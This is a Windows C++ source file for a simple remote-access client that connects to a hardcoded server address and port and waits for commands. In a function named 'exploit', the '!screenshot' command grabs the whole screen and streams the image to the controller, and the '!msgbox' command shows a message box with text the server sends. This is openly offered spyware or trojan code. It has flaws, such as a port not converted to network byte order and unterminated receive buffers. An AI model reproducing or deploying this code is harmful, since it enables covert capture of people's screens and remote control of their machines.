#pragma comment(lib, "ws2_32.lib")
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS


#include <stdio.h>
#include <string.h>
#include <WinSock2.h>
#include <Windows.h>
#include <locale>
#include <codecvt>
#include <iostream>

#define IP "127.0.0.1"
#define PORT 2189
#define BUF_SIZE 1024

void error_handling(char* message);
void screenshot(char* filename);
void exploit(int sock);

int main()
{
	int sock;
	struct sockaddr_in serv_addr;
	char message[100];
	int str_len;
	WSADATA wsaData;


	if (WSAStartup(MAKEWORD(2, 2), &wsaData) == -1) {
		error_handling((char*)"WSAStartup() error");

	}

	sock = socket(PF_INET, SOCK_STREAM, 0);
	if (sock == -1) error_handling((char*)"socket() error");

	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	serv_addr.sin_port = PORT;

	if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == -1) error_handling((char*)"connect() error");

	exploit(sock);


	closesocket(sock);
	WSACleanup();

	return 0;
}


void screenshot(char* filename)
{
	HDC hdcScreen = GetDC(NULL);
	HDC hdc = CreateCompatibleDC(hdcScreen);
	int width = GetDeviceCaps(hdcScreen, HORZRES);
	int height = GetDeviceCaps(hdcScreen, VERTRES);
	HBITMAP hbitmap = CreateCompatibleBitmap(hdcScreen, width, height);

	SelectObject(hdc, hbitmap);
	BitBlt(hdc, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

	BITMAPINFOHEADER bi;
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = width;
	bi.biHeight = -height;  //this is the line that makes it draw upside down or not
	bi.biPlanes = 1;
	bi.biBitCount = 32;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;

	DWORD dwBmpSize = ((width * bi.biBitCount + 31) / 32) * 4 * height;

	HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
	char* lpbitmap = (char*)GlobalLock(hDIB);

	// Gets the "bits" from the bitmap and copies them into a buffer 
	GetDIBits(hdc, hbitmap, 0, height, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

	HANDLE hFile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	BITMAPFILEHEADER bmfHeader;
	bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
	bmfHeader.bfSize = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	bmfHeader.bfType = 0x4D42; // "BM"

	DWORD dwBytesWritten = 0;
	WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
	WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
	WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);

	//Unlock and Free the DIB from the heap
	GlobalUnlock(hDIB);
	GlobalFree(hDIB);

	CloseHandle(hFile);

	//Clean up
	DeleteObject(hbitmap);
	DeleteDC(hdc);
	ReleaseDC(NULL, hdcScreen);



	return;
}


void exploit(int sock)
{
	char command[50];
	char response[50];

	while (1)
	{
		recv(sock, command, sizeof(command), 0);

		if (strcmp(command, "!close") == 0)
		{
			break;
			return;
		}

		else if (strcmp(command, "!screenshot") == 0)
		{
			FILE* fp;
			char buf[BUF_SIZE];
			int readCnt;

			//take screenshot
			screenshot((char*)"screenshot.bmp");

			//send screenshot.png to server
			fp = fopen("screenshot.bmp", "rb"); //file open
			while (true)
			{
				readCnt = fread(buf, 1, BUF_SIZE, fp);
				if (readCnt < BUF_SIZE) {
					send(sock, buf, readCnt, 0);
					break;
				}
				send(sock, buf, BUF_SIZE, 0);
			}

			fclose(fp);

			Sleep(500);

			strcpy(buf, "EOF"); //send EOF
			send(sock, buf, 4, 0);

		}

		else if (strcmp(command, "!msgbox") == 0)
		{
			char title[50]; char message[50];

			recv(sock, message, sizeof(message), 0);
			recv(sock, title, sizeof(title), 0);

			std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
			std::wstring wMessage = converter.from_bytes(message);
			std::wstring wTitle = converter.from_bytes(title);

			MessageBox(NULL, wMessage.c_str(), wTitle.c_str(), 0);
		}


		//else
		else
		{
			continue;
		}
	}


	return;
}


void error_handling(char* message)
{
	fputs(message, stderr);
	fputc('\n', stderr);
	exit(1);
}